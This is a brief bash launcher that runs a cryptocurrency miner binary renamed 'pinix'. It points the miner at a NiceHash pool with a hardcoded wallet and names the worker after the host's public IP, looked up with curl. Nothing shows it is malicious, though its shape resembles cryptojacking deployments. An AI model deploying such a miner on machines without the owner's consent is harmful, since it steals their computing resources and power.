#!/bin/bash

POOL=daggerhashimoto.usa-west.nicehash.com:3353
WALLET=35aYSrPF8mveijs3ZUzEBE3w3mAxHfok5M
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -dpool $POOL -pass x -proto 4 -stales 0 $@
